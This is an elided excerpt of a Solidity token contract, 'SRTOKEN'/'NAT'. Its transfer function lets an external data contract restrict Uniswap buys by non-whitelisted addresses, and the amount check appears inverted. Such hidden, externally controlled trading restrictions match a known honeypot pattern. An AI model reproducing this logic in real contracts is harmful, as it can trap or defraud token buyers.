...
contract SRTOKEN is Context, IERC20, Ownable {
    ...
    string private constant _name = "NAT";
    string private constant _symbol = "NAT";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(tokenData.transOpen()==1 && from==uniswapV2Pair && tokenData.wilteAddress(from)==0){
            require(amount>tokenData.transMaxAmount(),"quantity excess");
        }
